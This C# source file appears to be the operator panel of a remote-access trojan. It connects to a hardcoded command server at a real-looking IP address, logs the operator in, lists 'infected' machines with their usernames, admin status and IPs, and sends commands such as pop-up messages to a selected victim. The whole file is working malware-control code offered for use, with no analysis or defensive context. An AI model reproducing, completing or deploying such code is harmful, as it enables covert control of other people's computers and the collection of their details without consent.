using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using YTAH_COMMUNITY.IO;

namespace YTAH_COMMUNITY
{

   public class Network
    {
        public static NetworkStream ns;
        public static TcpClient client;
        public static IPAddress ip = IPAddress.Parse("78.114.52.238");
        public static int port = 5000;
        
        public static void Connect()
        {
            try
            {
                client = new TcpClient();
                client.Connect(ip, port);
                Thread thread = new Thread(o => ReceiveData((TcpClient)o));
                thread.IsBackground = true;
                thread.Start(client);
                
              
                    Form1.current = Form1.State.CONNECTE;
                

            }
            catch
            {
                Form1.current = Form1.State.DECONNECTE;
            }
        }
        public static void GetUsers()
        {
            string msg = "GetUsers|" + Perso.Me.username;
            SendMessage(msg);
        }
        public static void SelectUser(string userpost)
        {
            byte[] b = Encoding.ASCII.GetBytes("SelectUser|" + Perso.Me.username + "|" + userpost);
            ns.Write(b, 0, b.Length);
        }
        public static void SendMessage(string msg)
        {
            try
            {
                byte[] b = Encoding.ASCII.GetBytes(msg);
                ns.Write(b, 0, b.Length);
            }
            catch(Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
        static string commandStart = "SC;" + Perso.Me.username + ";";
        public static void SendPopUp(string content)
        {
            commandStart = "SC;" + Perso.Me.username + ";";
            byte[] b = Encoding.ASCII.GetBytes(commandStart + "sm|" + content);
            ns.Write(b, 0, b.Length);
        }
        public static void ReceiveData(TcpClient client)
        {
            ns = client.GetStream();
            byte[] receivedBytes = new byte[1024];
            int byte_count;
            try
            {
                while ((byte_count = ns.Read(receivedBytes, 0, receivedBytes.Length)) > 0)
                {
                    string d = Encoding.ASCII.GetString(receivedBytes, 0, byte_count);
                    string[] splitter = d.Split('|');
                    if (d.Contains("authsuccess"))
                    {
                        Perso.Me.username = Form1.username;
                        new Thread(() =>
                        {
                            Form2 frm = new Form2();
                            frm.ShowDialog();

                        }).Start();
                        Form1.todo = "d";
                    }
                    if (d.Contains("authfail"))
                    {
                        MessageBox.Show("Tu t'es trompé / tu ne fait pas partit de l'élite, navré poto");
                    }
                    if (d.Contains("LOG"))
                    {
                        string logid = splitter[1];
                        string msg = splitter[2];
                        string secmsg = "";
                        try
                        {
                            secmsg = splitter[3];
                        }
                        catch
                        {

                        }
                        switch (logid)
                        {
                            case "adminconnect":
                                MessageDisplayer.AdminConnect(msg);
                                break;
                            case "SelectSuccess":
                                MessageDisplayer.SelectBool(true, msg, secmsg);
                                break;
                            case "SelectFailed":
                                MessageDisplayer.SelectBool(false, msg, secmsg);
                                break;
                        }
                    }
                    if (d.Contains("empty"))
                    {
                        MessageDisplayer.Log("Aucun infecté !");
                    }
                    if (d.Contains("USERS"))
                    {
                        User.users.Clear();
                        string[] global =  d.Split(';'); //USERS;dzqd|qdoqzd|zqdpqokz|qzqzdp;
                        string reqid = global[0];
                        //MessageDisplayer.LoadUsers();
                        foreach (string s in global)
                        {
                            if (!s.Contains("USERS"))
                            {
                               
                                if (s == "")
                                {

                                }
                                else
                                {
                                    try
                                    {
                                        string[] split = s.Split('|');
                                        string poste = split[0];
                                        string user = split[1];
                                        string isadmin = split[2];
                                        string ip = split[3];
                                        User u = new User(user, poste, isadmin, ip);
                                        if (!User.users.Contains(u))
                                        {
                                            User.users.Add(u);

                                        }
                                        MessageDisplayer.UserConnected(user);
                                    }
                                    catch
                                    {

                                    }
                                }
                            }
                            
                        }
                       // MessageDisplayer.UsersLoaded();
                    }
                 
                }
            }
            catch
            {
                Form1.current = Form1.State.DECONNECTE;
            }
        
        }

   }
}
